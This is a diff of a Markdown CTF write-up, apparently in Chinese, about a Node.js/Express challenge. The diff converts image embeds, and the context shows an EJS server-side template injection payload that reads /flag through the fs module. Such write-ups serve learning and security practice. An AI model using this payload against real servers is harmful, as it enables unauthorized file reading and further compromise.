@@ -1,4 +1,4 @@
-![[Pasted image 20230205115018.png|500]]
+![](<./img/Pasted image 20230205115018.png>)
 
 ```javascript
 const express = require('express');
@@ -86,18 +86,18 @@ app.listen(8888, '0.0.0.0');
 
 对于`/`路由，存在`ejs`的`SSTI`，常规注入即可
 
-![[Pasted image 20230205122042.png|1000]]
+![](<./img/Pasted image 20230205122042.png>)
 
 ```
 /
 ```
 
-![[Pasted image 20230205124319.png|500]]
+![](<./img/Pasted image 20230205124319.png>)
 
 ```javascript
 <%= process.mainModule.require("fs").readFileSync('/flag'); %>
 ```
 
-![[Pasted image 20230205124914.png|700]]
+![](<./img/Pasted image 20230205124914.png>)
 
 #Web #nodejs #原型污染 #ejs #SSTI #RCE 
